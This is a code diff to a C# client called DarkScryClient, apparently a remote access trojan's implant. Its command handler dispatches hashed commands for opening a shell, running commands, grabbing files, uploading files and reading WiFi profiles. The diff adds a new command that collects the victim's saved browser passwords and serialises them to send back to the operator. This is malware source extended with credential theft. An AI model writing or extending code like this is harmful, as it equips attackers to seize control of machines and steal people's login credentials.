@@ -7,6 +7,8 @@ using System.Collections.Generic;
 using System.IO;
 using System.Text.Json;
 using System.Xml;
+using WebInfoGather;
+
 
 namespace DarkScryClient.Client
 {
@@ -14,13 +16,15 @@ namespace DarkScryClient.Client
 	{
 		private readonly struct CommandIdentifiers
 		{
-			public const string START_SHELL_INSTANCE   = "be425fd08e9ea24230bac47493228ada";
-			public const string RUN_COMMAND            = "58e129c7158b9fed8be5473640e54ae4";
-			public const string GET_BASIC_MACHINE_INFO = "929cecb8e795d93306020c7f2e8682d2";
-			public const string SNAP_FULL_DIRECTORY    = "74d6aa572d1b19102f9f5aedbe00dfd0";
-			public const string GET_FILE_BASE_64       = "d69c0ca9f6848c89b7e9223b2d186a15";
-			public const string UPLOAD_FILE_BASE_64    = "81324d42b1bbe52342d521ee64b7a30f";
-			public const string GET_WIFI_BAISIC_INFO   = "0c9f43143832f340691b2f701b5d56fa";
+			public const string START_SHELL_INSTANCE         = "be425fd08e9ea24230bac47493228ada";
+			public const string RUN_COMMAND                  = "58e129c7158b9fed8be5473640e54ae4";
+			public const string GET_BASIC_MACHINE_INFO       = "929cecb8e795d93306020c7f2e8682d2";
+			public const string SNAP_FULL_DIRECTORY          = "74d6aa572d1b19102f9f5aedbe00dfd0";
+			public const string GET_FILE_BASE_64             = "d69c0ca9f6848c89b7e9223b2d186a15";
+			public const string UPLOAD_FILE_BASE_64          = "81324d42b1bbe52342d521ee64b7a30f";
+			public const string GET_WIFI_BAISIC_INFO         = "0c9f43143832f340691b2f701b5d56fa";
+			public const string FETCH_WEB_BROSER_CREDENTIALS = "852d663cbe347857ffe2bfadb378d3be";
+
 		}
 
 		private XmlDocument xmlDoc;
@@ -82,6 +86,9 @@ namespace DarkScryClient.Client
 				case CommandIdentifiers.GET_WIFI_BAISIC_INFO:
 					var profiles = GatherWifiInfo.GetBasicWifiInfo();
 					return Tools.StringToBytes(JsonSerializer.Serialize(profiles));
+
+				case CommandIdentifiers.FETCH_WEB_BROSER_CREDENTIALS:
+					return Tools.StringToBytes(JsonSerializer.Serialize(WebCredentialCollector.GatherLoginData(WebCredentialCollector.CollectionType.Passwords)));
 
 				default:
 					return PackCommand("Unknow Action", action, 1);
